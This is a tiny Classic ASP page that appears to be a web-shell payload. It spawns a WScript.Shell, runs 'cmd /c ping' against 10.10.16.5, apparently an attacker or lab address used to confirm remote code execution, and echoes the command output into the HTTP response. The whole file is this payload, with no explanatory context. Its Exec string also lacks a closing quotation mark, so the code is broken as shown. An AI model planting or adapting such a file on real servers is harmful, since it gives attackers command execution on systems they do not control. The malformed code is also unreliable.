<%
Set s = CreateObject("WScript.Shell")
Set cmd = s.Exec("cmd /c ping 10.10.16.5)
o = cmd.StdOut.Readall()
Response.write(o)
%>
